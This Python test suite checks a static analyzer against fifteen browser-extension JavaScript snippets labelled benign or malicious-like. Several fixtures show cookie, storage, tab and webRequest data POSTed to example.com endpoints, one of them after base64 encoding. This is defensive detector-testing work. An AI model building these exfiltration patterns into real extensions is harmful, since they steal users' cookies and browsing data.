"""
Browser Extension API Validation Test Suite

Purpose:
    Test the existing static-analysis pipeline against
    browser-extension-specific APIs and realistic usage patterns.

    This test intentionally does NOT modify the analyzer.

    It tells us which extension API patterns are already
    understood by the current implementation and which ones
    require additional analysis support.

Run:
    python test_extension_api_validation.py
"""

from pathlib import Path
import shutil
import sys

from analyzer.ast_analyzer import analyze_javascript_file
from analyzer.data_flow_analyzer import analyze_data_flow
from analyzer.evidence_engine import analyze_evidence


# ============================================================
# CONFIGURATION
# ============================================================

TEST_ROOT = Path("Extension_API_Validation_Tests")


# ============================================================
# TEST CASES
# ============================================================

TEST_CASES = [

    # --------------------------------------------------------
    # 1. BENIGN CHROME RUNTIME
    # --------------------------------------------------------

    {
        "name": "01_runtime_benign",
        "category": "BENIGN",
        "description": (
            "Normal chrome.runtime API usage without "
            "sensitive data transmission."
        ),
        "code": """
chrome.runtime.onInstalled.addListener(() => {
    console.log("Extension installed");
});

chrome.runtime.sendMessage({
    type: "STATUS",
    value: "ready"
});
""",
        "expected_findings": 0,
    },


    # --------------------------------------------------------
    # 2. BENIGN STORAGE
    # --------------------------------------------------------

    {
        "name": "02_storage_benign",
        "category": "BENIGN",
        "description": (
            "Normal chrome.storage usage with a fixed value."
        ),
        "code": """
chrome.storage.local.set({
    enabled: true
});

chrome.storage.local.get(
    ["enabled"],
    (result) => {
        console.log(result.enabled);
    }
);
""",
        "expected_findings": 0,
    },


    # --------------------------------------------------------
    # 3. COOKIE API READ
    # --------------------------------------------------------

    {
        "name": "03_chrome_cookies_read",
        "category": "SENSITIVE-API",
        "description": (
            "chrome.cookies API reads browser cookie data "
            "without network transmission."
        ),
        "code": """
chrome.cookies.getAll(
    {},
    (cookies) => {
        console.log(cookies);
    }
);
""",
        "expected_findings": 0,
    },


    # --------------------------------------------------------
    # 4. COOKIE API -> FETCH
    # --------------------------------------------------------

    {
        "name": "04_chrome_cookies_fetch",
        "category": "MALICIOUS-LIKE",
        "description": (
            "Cookie data obtained through chrome.cookies "
            "is transmitted to an external endpoint."
        ),
        "code": """
chrome.cookies.getAll(
    {},
    (cookies) => {

        fetch("https://example.com/cookies", {
            method: "POST",
            body: JSON.stringify(cookies)
        });

    }
);
""",
        "expected_findings": 1,
    },


    # --------------------------------------------------------
    # 5. STORAGE DATA -> FETCH
    # --------------------------------------------------------

    {
        "name": "05_storage_fetch",
        "category": "MALICIOUS-LIKE",
        "description": (
            "Stored extension data is obtained and "
            "transmitted externally."
        ),
        "code": """
chrome.storage.local.get(
    ["userData"],
    (result) => {

        const data = result.userData;

        fetch("https://example.com/storage", {
            method: "POST",
            body: data
        });

    }
);
""",
        "expected_findings": 1,
    },


    # --------------------------------------------------------
    # 6. TABS API
    # --------------------------------------------------------

    {
        "name": "06_tabs_url_fetch",
        "category": "SUSPICIOUS",
        "description": (
            "Current tab information is obtained and "
            "transmitted externally."
        ),
        "code": """
chrome.tabs.query(
    {
        active: true,
        currentWindow: true
    },
    (tabs) => {

        const currentTab = tabs[0];

        fetch("https://example.com/tabs", {
            method: "POST",
            body: JSON.stringify(currentTab)
        });

    }
);
""",
        "expected_findings": 1,
    },


    # --------------------------------------------------------
    # 7. WEBREQUEST API
    # --------------------------------------------------------

    {
        "name": "07_webrequest_details",
        "category": "SENSITIVE-API",
        "description": (
            "webRequest event receives request details "
            "and transmits them externally."
        ),
        "code": """
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {

        const requestData = details;

        fetch("https://example.com/requests", {
            method: "POST",
            body: JSON.stringify(requestData)
        });

    },
    {
        urls: ["<all_urls>"]
    }
);
""",
        "expected_findings": 1,
    },


    # --------------------------------------------------------
    # 8. SCRIPTING API BENIGN
    # --------------------------------------------------------

    {
        "name": "08_scripting_benign",
        "category": "BENIGN",
        "description": (
            "Normal chrome.scripting usage with fixed code."
        ),
        "code": """
chrome.scripting.executeScript({
    target: {
        tabId: 123
    },
    func: () => {
        console.log("Hello");
    }
});
""",
        "expected_findings": 0,
    },


    # --------------------------------------------------------
    # 9. COOKIE -> FUNCTION -> FETCH
    # --------------------------------------------------------

    {
        "name": "09_cookie_interprocedural",
        "category": "MALICIOUS-LIKE",
        "description": (
            "Cookie API data flows through a function "
            "parameter before reaching fetch."
        ),
        "code": """
function transmit(data) {

    fetch("https://example.com/transmit", {
        method: "POST",
        body: JSON.stringify(data)
    });

}

chrome.cookies.getAll(
    {},
    (cookies) => {

        transmit(cookies);

    }
);
""",
        "expected_findings": 1,
    },


    # --------------------------------------------------------
    # 10. COOKIE -> ENCODING -> FETCH
    # --------------------------------------------------------

    {
        "name": "10_cookie_encoded",
        "category": "MALICIOUS-LIKE",
        "description": (
            "Cookie API data is serialized and encoded "
            "before network transmission."
        ),
        "code": """
chrome.cookies.getAll(
    {},
    (cookies) => {

        const serialized = JSON.stringify(cookies);

        const encoded = btoa(serialized);

        fetch("https://example.com/encoded", {
            method: "POST",
            body: encoded
        });

    }
);
""",
        "expected_findings": 1,
    },


    # --------------------------------------------------------
    # 11. RUNTIME MESSAGE BENIGN
    # --------------------------------------------------------

    {
        "name": "11_runtime_message_benign",
        "category": "BENIGN",
        "description": (
            "Runtime messaging containing a fixed status value."
        ),
        "code": """
chrome.runtime.onMessage.addListener(
    (message, sender, sendResponse) => {

        sendResponse({
            status: "ok"
        });

    }
);
""",
        "expected_findings": 0,
    },


    # --------------------------------------------------------
    # 12. RUNTIME MESSAGE -> FETCH
    # --------------------------------------------------------

    {
        "name": "12_runtime_message_fetch",
        "category": "SUSPICIOUS",
        "description": (
            "Data received through runtime messaging "
            "is transmitted externally."
        ),
        "code": """
chrome.runtime.onMessage.addListener(
    (message, sender, sendResponse) => {

        const receivedData = message;

        fetch("https://example.com/message", {
            method: "POST",
            body: JSON.stringify(receivedData)
        });

    }
);
""",
        "expected_findings": 1,
    },


    # --------------------------------------------------------
    # 13. TAB DATA USED LOCALLY
    # --------------------------------------------------------

    {
        "name": "13_tabs_local_only",
        "category": "SUSPICIOUS",
        "description": (
            "Tab information is accessed but remains local."
        ),
        "code": """
chrome.tabs.query(
    {
        active: true
    },
    (tabs) => {

        const currentTab = tabs[0];

        console.log(currentTab);

    }
);
""",
        "expected_findings": 0,
    },


    # --------------------------------------------------------
    # 14. MULTIPLE API SOURCES -> ONE SINK
    # --------------------------------------------------------

    {
        "name": "14_multiple_sources",
        "category": "MALICIOUS-LIKE",
        "description": (
            "Multiple extension API sources flow into "
            "network transmission."
        ),
        "code": """
chrome.cookies.getAll(
    {},
    (cookies) => {

        const cookieData = cookies;

        fetch("https://example.com/multi-cookie", {
            method: "POST",
            body: JSON.stringify(cookieData)
        });

    }
);

chrome.tabs.query(
    {
        active: true
    },
    (tabs) => {

        const tabData = tabs;

        fetch("https://example.com/multi-tab", {
            method: "POST",
            body: JSON.stringify(tabData)
        });

    }
);
""",
        "expected_findings": 2,
    },


    # --------------------------------------------------------
    # 15. NORMAL API + NORMAL NETWORK
    # --------------------------------------------------------

    {
        "name": "15_extension_normal_activity",
        "category": "BENIGN",
        "description": (
            "Combination of ordinary extension APIs and "
            "normal fixed network communication."
        ),
        "code": """
chrome.runtime.onInstalled.addListener(() => {

    chrome.storage.local.set({
        initialized: true
    });

    fetch("https://example.com/status", {
        method: "GET"
    });

});
""",
        "expected_findings": 0,
    },
]


# ============================================================
# TEST ENVIRONMENT
# ============================================================

def create_test_environment():
    """
    Create a temporary directory containing the validation cases.
    """

    if TEST_ROOT.exists():
        shutil.rmtree(TEST_ROOT)

    TEST_ROOT.mkdir(
        parents=True,
        exist_ok=True
    )


# ============================================================
# WRITE TEST CASE
# ============================================================

def write_test_case(test_case):
    """
    Write a JavaScript test case to disk.
    """

    test_directory = (
        TEST_ROOT /
        test_case["name"]
    )

    test_directory.mkdir(
        parents=True,
        exist_ok=True
    )

    js_file = (
        test_directory /
        "background.js"
    )

    js_file.write_text(
        test_case["code"].strip() + "\n",
        encoding="utf-8"
    )

    return js_file


# ============================================================
# EVIDENCE COUNT
# ============================================================

def get_evidence_count(evidence_result):
    """
    Extract evidence count from the evidence-engine result.
    """

    if not isinstance(
        evidence_result,
        dict
    ):
        return 0

    evidence = evidence_result.get(
        "evidence"
    )

    if isinstance(
        evidence,
        list
    ):
        return len(evidence)

    count = evidence_result.get(
        "evidence_count"
    )

    if isinstance(
        count,
        int
    ):
        return count

    count = evidence_result.get(
        "count"
    )

    if isinstance(
        count,
        int
    ):
        return count

    return 0


# ============================================================
# SENSITIVE FLOW STATUS
# ============================================================

def get_sensitive_flow(evidence_result):
    """
    Determine whether the evidence engine reports
    a sensitive data flow.
    """

    if not isinstance(
        evidence_result,
        dict
    ):
        return False

    for key in (
        "sensitive_data_flow",
        "has_sensitive_data_flow",
        "sensitive_flow"
    ):

        value = evidence_result.get(
            key
        )

        if isinstance(
            value,
            bool
        ):
            return value

    return False


# ============================================================
# PRINT FINDINGS
# ============================================================

def print_findings(
    data_flow_result,
    evidence_result
):
    """
    Print detected findings for debugging.
    """

    print()

    print("Data-Flow Findings")
    print("-" * 70)

    if isinstance(
        data_flow_result,
        dict
    ):

        findings = data_flow_result.get(
            "findings",
            []
        )

        if findings:

            for number, finding in enumerate(
                findings,
                start=1
            ):

                if not isinstance(
                    finding,
                    dict
                ):
                    print(
                        f"Finding #{number}: "
                        f"{finding}"
                    )
                    continue

                print(
                    f"Finding #{number}"
                )

                print(
                    f"    Source       : "
                    f"{finding.get('source')}"
                )

                print(
                    f"    Source Type  : "
                    f"{finding.get('source_type')}"
                )

                print(
                    f"    Sink         : "
                    f"{finding.get('sink')}"
                )

                print(
                    f"    Sink Line    : "
                    f"{finding.get('sink_line')}"
                )

                print(
                    f"    Destination  : "
                    f"{finding.get('destination')}"
                )

                print(
                    f"    Flow Type    : "
                    f"{finding.get('flow_type')}"
                )

        else:

            print(
                "No data-flow findings."
            )

    print()

    print("Evidence Findings")
    print("-" * 70)

    if isinstance(
        evidence_result,
        dict
    ):

        evidence = evidence_result.get(
            "evidence",
            []
        )

        if isinstance(
            evidence,
            list
        ) and evidence:

            for number, item in enumerate(
                evidence,
                start=1
            ):

                if not isinstance(
                    item,
                    dict
                ):

                    print(
                        f"Evidence #{number}: "
                        f"{item}"
                    )

                    continue

                print(
                    f"Evidence #{number}"
                )

                print(
                    f"    Type         : "
                    f"{item.get('type')}"
                )

                print(
                    f"    Source       : "
                    f"{item.get('source')}"
                )

                print(
                    f"    Sink         : "
                    f"{item.get('sink')}"
                )

                print(
                    f"    Destination  : "
                    f"{item.get('destination')}"
                )

                print(
                    f"    Confidence   : "
                    f"{item.get('confidence')}"
                )

        else:

            print(
                "No evidence findings."
            )


# ============================================================
# RUN SINGLE TEST
# ============================================================

def run_single_test(
    index,
    total,
    test_case
):
    """
    Run one extension API validation test.
    """

    print()
    print("=" * 70)

    print(
        f"TEST {index}/{total}: "
        f"{test_case['name']}"
    )

    print("=" * 70)

    print(
        f"Category    : "
        f"{test_case['category']}"
    )

    print(
        f"Description : "
        f"{test_case['description']}"
    )

    print(
        f"Expected    : "
        f"{test_case['expected_findings']} finding(s)"
    )

    js_file = write_test_case(
        test_case
    )

    try:

        # ====================================================
        # AST
        # ====================================================

        print()
        print("[1] AST Analysis")

        program_model = (
            analyze_javascript_file(
                str(js_file)
            )
        )

        if program_model is None:

            print(
                "FAIL: AST analyzer returned None."
            )

            return False

        syntax_error = getattr(
            program_model,
            "syntax_error",
            False
        )

        if syntax_error:

            print(
                "FAIL: Syntax error detected."
            )

            return False

        print(
            "PASS: AST analysis completed."
        )

        # ====================================================
        # DATA FLOW
        # ====================================================

        print()
        print("[2] Data-Flow Analysis")

        data_flow_result = (
            analyze_data_flow(
                program_model
            )
        )

        if data_flow_result is None:

            print(
                "FAIL: Data-flow analyzer returned None."
            )

            return False

        print(
            "PASS: Data-flow analysis completed."
        )

        # ====================================================
        # EVIDENCE
        # ====================================================

        print()
        print("[3] Evidence Analysis")

        evidence_result = (
            analyze_evidence(
                data_flow_result
            )
        )

        if evidence_result is None:

            print(
                "FAIL: Evidence engine returned None."
            )

            return False

        print(
            "PASS: Evidence analysis completed."
        )

        # ====================================================
        # SUMMARY
        # ====================================================

        sources = 0
        sinks = 0
        findings = 0

        if isinstance(
            data_flow_result,
            dict
        ):

            sources = len(
                data_flow_result.get(
                    "sources",
                    []
                )
            )

            sinks = len(
                data_flow_result.get(
                    "network_operations",
                    []
                )
            )

            findings = len(
                data_flow_result.get(
                    "findings",
                    []
                )
            )

        evidence_count = (
            get_evidence_count(
                evidence_result
            )
        )

        sensitive_flow = (
            get_sensitive_flow(
                evidence_result
            )
        )

        print()
        print("Analysis Summary")
        print("-" * 70)

        print(
            f"Security Sources   : "
            f"{sources}"
        )

        print(
            f"Network Sinks      : "
            f"{sinks}"
        )

        print(
            f"Data-Flow Findings : "
            f"{findings}"
        )

        print(
            f"Evidence Findings  : "
            f"{evidence_count}"
        )

        print(
            f"Sensitive Flow     : "
            f"{sensitive_flow}"
        )

        # ====================================================
        # VALIDATION
        # ====================================================

        expected = test_case[
            "expected_findings"
        ]

        print()
        print("Validation")
        print("-" * 70)

        print(
            f"Expected findings : "
            f"{expected}"
        )

        print(
            f"Actual findings   : "
            f"{evidence_count}"
        )

        if evidence_count == expected:

            print()
            print("RESULT: PASS")

            return True

        print()
        print("RESULT: FAIL")

        print(
            "The detected evidence count does not "
            "match the expected count."
        )

        print_findings(
            data_flow_result,
            evidence_result
        )

        return False

    except Exception as exc:

        print()
        print("RESULT: ERROR")

        print(
            f"Error Type : "
            f"{type(exc).__name__}"
        )

        print(
            f"Error      : "
            f"{exc}"
        )

        return False


# ============================================================
# FINAL REPORT
# ============================================================

def print_final_report(
    results
):
    """
    Print final validation results.
    """

    total = len(
        results
    )

    passed = sum(
        1
        for result in results
        if result["passed"]
    )

    failed = (
        total -
        passed
    )

    print()
    print()
    print("#" * 70)
    print(
        "BROWSER EXTENSION API VALIDATION REPORT"
    )
    print("#" * 70)

    print()

    print(
        f"Total Tests : "
        f"{total}"
    )

    print(
        f"Passed      : "
        f"{passed}"
    )

    print(
        f"Failed      : "
        f"{failed}"
    )

    if total:

        pass_rate = (
            passed /
            total
        ) * 100

        print(
            f"Pass Rate   : "
            f"{pass_rate:.1f}%"
        )

    print()
    print("Results")
    print("-" * 70)

    for result in results:

        status = (
            "PASS"
            if result["passed"]
            else "FAIL"
        )

        print(
            f"[{status}] "
            f"{result['name']} "
            f"({result['category']})"
        )

    print()

    if failed == 0:

        print("=" * 70)
        print(
            "ALL EXTENSION API TESTS PASSED"
        )
        print("=" * 70)

        print()

        print(
            "The current analyzer successfully "
            "handled the complete extension API "
            "validation corpus."
        )

    else:

        print("=" * 70)
        print(
            "EXTENSION API COVERAGE REQUIRES ANALYSIS"
        )
        print("=" * 70)

        print()

        print(
            "Some tests did not match the expected "
            "behavior."
        )

        print()

        print(
            "This is expected at this stage."
        )

        print(
            "The failures will show us which "
            "browser-extension data-flow patterns "
            "need to be implemented next."
        )


# ============================================================
# CLEANUP
# ============================================================

def cleanup():

    if not TEST_ROOT.exists():
        return

    try:

        shutil.rmtree(
            TEST_ROOT
        )

    except Exception as exc:

        print()
        print(
            f"Warning: Could not remove "
            f"{TEST_ROOT}: {exc}"
        )


# ============================================================
# MAIN
# ============================================================

def main():

    print("=" * 70)
    print(
        "BROWSER EXTENSION API VALIDATION TEST SUITE"
    )
    print("=" * 70)

    print()

    print(
        "Testing the existing static analyzer against "
        "browser-extension-specific APIs."
    )

    print()

    print(
        f"Number of tests: "
        f"{len(TEST_CASES)}"
    )

    create_test_environment()

    results = []

    try:

        total = len(
            TEST_CASES
        )

        for index, test_case in enumerate(
            TEST_CASES,
            start=1
        ):

            passed = run_single_test(
                index,
                total,
                test_case
            )

            results.append(
                {
                    "name": test_case["name"],
                    "category": test_case["category"],
                    "passed": passed,
                }
            )

        print_final_report(
            results
        )

    finally:

        cleanup()

    failed = sum(
        1
        for result in results
        if not result["passed"]
    )

    if failed:
        return 1

    return 0


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":

    sys.exit(
        main()
    )